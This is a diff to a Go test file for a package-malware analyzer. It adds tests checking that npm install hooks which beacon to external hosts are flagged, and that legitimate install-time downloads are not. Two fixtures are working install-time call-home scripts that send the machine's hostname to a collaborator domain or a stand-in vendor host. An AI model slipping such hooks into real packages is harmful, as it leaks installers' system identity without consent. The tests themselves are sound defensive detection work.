@@ -398,6 +398,73 @@ func TestShellReconExfilInHook(t *testing.T) {
 	}
 }
 
+func TestInstallHookExternalFetch(t *testing.T) {
+	npm := verdict.Artifact{Ecosystem: verdict.NPM, Name: "x", Version: "1.0.0"}
+	// The gap this closes: the hook COMMAND is innocuous (`node postinstall.js`), so
+	// npm-install-hook-network sees nothing; the endpoint is one file away. This is
+	// the install-beacon shape (collaborator / tunnel domains) and was ~half the
+	// sub-threshold misses on the 2026 held-out set.
+	beacon := unpacked(map[string]string{
+		"package.json":   `{"name":"x","scripts":{"postinstall":"node postinstall.js"}}`,
+		"postinstall.js": "const https=require('https');const os=require('os');\nhttps.request('https://abcd1234.oastify.com/'+os.hostname()).end();",
+	})
+	if hasRuleSet(Analyze(npm, beacon))["install-hook-external-fetch"] != verdict.SevHigh {
+		t.Fatalf("install-hook beacon to a collaborator domain not flagged high: %+v", Analyze(npm, beacon))
+	}
+	// Precision: core-js shape — a postinstall that PRINTS funding URLs but makes no
+	// network call. Requiring a real call is what keeps this quiet.
+	funding := unpacked(map[string]string{
+		"package.json":   `{"name":"x","scripts":{"postinstall":"node postinstall.js"}}`,
+		"postinstall.js": "console.log('Support us at https://opencollective.com/core-js and https://patreon.com/zloirock');",
+	})
+	if hasRule(Analyze(npm, funding), "install-hook-external-fetch") != nil {
+		t.Fatal("funding-message postinstall (no network call) wrongly flagged")
+	}
+	// Precision: esbuild shape — a real install-time download, but from the registry.
+	registry := unpacked(map[string]string{
+		"package.json": `{"name":"x","scripts":{"postinstall":"node install.js"}}`,
+		"install.js":   "const https=require('https');https.get('https://registry.npmjs.org/@esbuild/linux-x64/-/linux-x64-0.20.0.tgz',r=>r.pipe(f));",
+	})
+	if hasRule(Analyze(npm, registry), "install-hook-external-fetch") != nil {
+		t.Fatal("registry download at install wrongly flagged")
+	}
+	// Precision: prebuilt binaries from GitHub releases are legitimate for native
+	// packages (sharp, node-sass); allowlisted deliberately, at a known recall cost.
+	gh := unpacked(map[string]string{
+		"package.json": `{"name":"x","scripts":{"install":"node install.js"}}`,
+		"install.js":   "const https=require('https');https.get('https://github.com/org/pkg/releases/download/v1/bin.tgz',r=>r.pipe(f));",
+	})
+	if hasRule(Analyze(npm, gh), "install-hook-external-fetch") != nil {
+		t.Fatal("github-releases prebuilt download wrongly flagged")
+	}
+	// Precision (the important one): a package fetching its OWN prebuilt binary from
+	// a vendor CDN is the native-package norm and no allowlist can enumerate every
+	// vendor. An unknown host alone must not fire — this is why the rule needs a
+	// second indicator. (Regression: this shape broke the synthetic corpus control.)
+	cdn := unpacked(map[string]string{
+		"package.json": `{"name":"x","scripts":{"postinstall":"node install.js"}}`,
+		"install.js":   "const os=require('os');const url='https://cdn.vendor.example/'+process.platform+'-'+os.arch()+'.node';require('https').get(url);",
+	})
+	if hasRule(Analyze(npm, cdn), "install-hook-external-fetch") != nil {
+		t.Fatal("vendor-CDN prebuilt binary fetch wrongly flagged")
+	}
+	// But the same unknown host WITH host identity flowing out is a call-home.
+	callHome := unpacked(map[string]string{
+		"package.json":   `{"name":"x","scripts":{"postinstall":"node p.js"}}`,
+		"p.js":           "const os=require('os');require('https').get('https://cdn.vendor.example/ping?h='+os.hostname());",
+	})
+	if hasRuleSet(Analyze(npm, callHome))["install-hook-external-fetch"] != verdict.SevHigh {
+		t.Fatal("install-time call-home carrying host identity not flagged")
+	}
+	// A non-hook runtime module doing the same fetch is NOT install-time; no signal.
+	runtime := unpacked(map[string]string{
+		"lib/client.js": "const https=require('https');https.request('https://api.vendor.example/v1').end();",
+	})
+	if hasRule(Analyze(npm, runtime), "install-hook-external-fetch") != nil {
+		t.Fatal("runtime module fetch wrongly flagged as install-hook fetch")
+	}
+}
+
 func TestHardcodedWebhookExfil(t *testing.T) {
 	art := verdict.Artifact{Ecosystem: verdict.PyPI, Name: "x", Version: "1.0.0"}
 	// Discord token/cookie stealer: a hardcoded webhook with a real id+token, run at
